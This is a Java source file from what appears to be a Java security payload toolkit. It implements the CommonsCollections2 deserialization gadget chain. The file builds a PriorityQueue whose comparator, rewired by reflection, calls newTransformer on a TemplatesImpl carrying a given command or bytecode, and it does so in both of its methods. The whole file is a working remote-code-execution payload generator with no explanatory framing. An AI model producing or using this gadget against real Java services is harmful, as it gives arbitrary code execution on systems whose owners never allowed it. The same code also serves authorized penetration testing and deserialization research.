package com.xyuxu.javasec.core.payload.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsCollections2  implements ObjectPayload,BytecodePayload {
    @Override
    public Queue<Object> getObject(final String command) throws Exception {

        final TemplatesImpl templates = TemplatesBytecodeGenerator.createTemplatesImpl(command);

        final InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0],new Object[0]);

        final PriorityQueue<Object> queue =new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }

    @Override
    public Queue<Object> getObjectWithBytecode(byte[] bytecode) throws Exception {

        final TemplatesImpl templates = TemplatesBytecodeGenerator.createTemplatesImplWithBytecode(bytecode);
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, new TransformingComparator(transformer));
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;
        return queue;
    }
}
